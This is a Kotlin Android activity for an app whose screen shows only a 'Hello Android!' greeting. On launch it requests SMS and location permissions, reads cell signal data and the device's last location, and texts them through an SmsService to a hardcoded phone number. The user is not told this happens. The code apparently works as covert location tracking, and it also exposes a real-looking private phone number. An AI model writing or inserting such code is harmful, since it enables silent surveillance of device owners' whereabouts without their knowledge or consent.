package com.example.baruim1

import android.Manifest.permission.*
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.os.Bundle
import android.telephony.*
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.baruim1.ui.theme.Baruim1Theme
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.tasks.Task

class MainActivity : ComponentActivity() {
    private val REQUEST_SMS_PERMISSION = 1
    private lateinit var fusedLocationClient: FusedLocationProviderClient

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        requestPermissions()

        setContent {
            Baruim1Theme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Greeting("Android")
                }
            }
        }
    }

    private fun requestPermissions() {
        if (ContextCompat.checkSelfPermission(this, SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, READ_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(SEND_SMS, RECEIVE_SMS, READ_SMS, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION), REQUEST_SMS_PERMISSION)
        } else {
            // Permissions are already granted
            getCellAndLocationInfo()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_SMS_PERMISSION) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                getCellAndLocationInfo()
            } else {
                Toast.makeText(this, "Permission denied to send/receive SMS and access location", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun getCellAndLocationInfo() {
        // Get cell info
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val cellInfo: List<CellInfo> = telephonyManager.allCellInfo

        var cellSignalStrength: Int? = null
        var cellTechnology: String? = null

        for (info in cellInfo) {
            when (info) {
                is CellInfoLte -> {
                    cellSignalStrength = info.cellSignalStrength.dbm
                    cellTechnology = "LTE"
                }
                is CellInfoGsm -> {
                    cellSignalStrength = info.cellSignalStrength.dbm
                    cellTechnology = "GSM"
                }
                is CellInfoWcdma -> {
                    cellSignalStrength = info.cellSignalStrength.dbm
                    cellTechnology = "WCDMA"
                }
                is CellInfoCdma -> {
                    cellSignalStrength = info.cellSignalStrength.dbm
                    cellTechnology = "CDMA"
                }
            }
            if (cellSignalStrength != null && cellTechnology != null) break
        }

        // Get location info
        if (ActivityCompat.checkSelfPermission(this, ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        val locationTask: Task<Location> = fusedLocationClient.lastLocation
        locationTask.addOnSuccessListener { location ->
            if (location != null) {
                val locationString = "Lat: ${location.latitude}, Long: ${location.longitude}"
                val cellInfoString = "Signal Strength: $cellSignalStrength dBm, Technology: $cellTechnology"
                sendSmsWithInfo("09100069381", cellInfoString, locationString)
            } else {
                Log.e("MainActivity", "Location is null")
            }
        }
    }

    private fun sendSmsWithInfo(phoneNumber: String, cellInfo: String, location: String) {
        val message = "Cell Info: $cellInfo\nLocation: $location"
        val intent = Intent(this, SmsService::class.java).apply {
            putExtra("phone_number", phoneNumber)
            putExtra("message", message)
        }
        startService(intent)
    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    Baruim1Theme {
        Greeting("Android")
    }
}
